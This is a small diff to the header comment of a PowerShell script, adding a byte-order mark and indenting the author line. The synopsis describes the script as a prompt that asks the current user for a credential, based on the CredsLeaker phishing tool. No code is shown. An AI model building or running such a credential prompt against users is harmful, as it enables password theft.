@@ -1,8 +1,8 @@
-<#
+﻿<#
 .SYNOPSIS
   Standalone Powershell script that will promp the current user for a valid credential.
 
-Author: r00t-3xp10it - (Based on @Dviros CredsLeaker)
+  Author: r00t-3xp10it - (Based on @Dviros CredsLeaker)
   Required Dependencies: Target Account Password Set
   Optional Dependencies: None
   PS Script Dev Version: v1.0
